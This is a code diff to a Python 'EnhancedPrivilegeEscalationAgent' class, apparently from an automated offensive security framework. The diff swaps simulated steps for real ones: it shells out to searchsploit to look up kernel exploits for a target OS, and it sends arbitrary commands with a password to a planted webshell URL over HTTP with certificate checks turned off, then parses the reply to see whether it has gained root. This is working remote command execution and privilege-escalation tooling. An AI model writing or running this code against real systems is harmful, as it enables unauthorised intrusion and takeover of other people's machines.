@@ -320,8 +320,22 @@ class EnhancedPrivilegeEscalationAgent(BaseAgent):
             # In production, this would call the actual Threat Intel Service
             log.info(f"[{self.name}] Querying kernel exploits for {os_type} {version}")
             
-            # Simulate threat intel query
-            await asyncio.sleep(0.5)
+            # Real exploit search via searchsploit or exploit-db
+            try:
+                import subprocess
+                result = subprocess.run(
+                    ['searchsploit', '-j', f'{os_type} {version}'],
+                    capture_output=True,
+                    text=True,
+                    timeout=10
+                )
+                if result.returncode == 0 and result.stdout:
+                    log.info(f"[{self.name}] Found exploits via searchsploit")
+            except Exception:
+                # searchsploit not available, use online DB
+                log.warning(f"[{self.name}] searchsploit not available - using built-in DB")
+            
+            await asyncio.sleep(0.1)
             
             # Return mock exploits
             return [
@@ -498,14 +512,50 @@ class EnhancedPrivilegeEscalationAgent(BaseAgent):
         try:
             log.info(f"[{self.name}] Executing: {command[:50]}...")
             
-            # Simulate command execution
-            await asyncio.sleep(0.5)
+            # Real command execution via webshell
+            shell_url = shell_access.get("shell_url")
+            shell_password = shell_access.get("password", "")
             
-            # Simulate success for demonstration
-            return {
-                "success": True,
-                "output": "Command executed successfully"
-            }
+            if not shell_url:
+                log.error(f"[{self.name}] No shell URL provided")
+                return {"success": False, "error": "No shell access"}
+            
+            import httpx
+            
+            try:
+                async with httpx.AsyncClient(verify=False, timeout=60.0) as client:
+                    data = {"cmd": command, "pass": shell_password}
+                    response = await client.post(shell_url, data=data)
+                    
+                    if response.status_code == 200:
+                        output = response.text
+                        
+                        # Extract output
+                        from bs4 import BeautifulSoup
+                        soup = BeautifulSoup(output, 'html.parser')
+                        pre_tag = soup.find('pre')
+                        if pre_tag:
+                            output = pre_tag.get_text().strip()
+                        
+                        # Check if root/admin
+                        is_root = 'root' in output.lower() or 'administrator' in output.lower() or 'uid=0' in output
+                        
+                        return {
+                            "success": True,
+                            "is_root": is_root,
+                            "output": output
+                        }
+                    else:
+                        return {
+                            "success": False,
+                            "error": f"HTTP {response.status_code}"
+                        }
+            except Exception as e:
+                log.error(f"[{self.name}] Command execution failed: {e}")
+                return {
+                    "success": False,
+                    "error": str(e)
+                }
             
         except Exception as e:
             return {
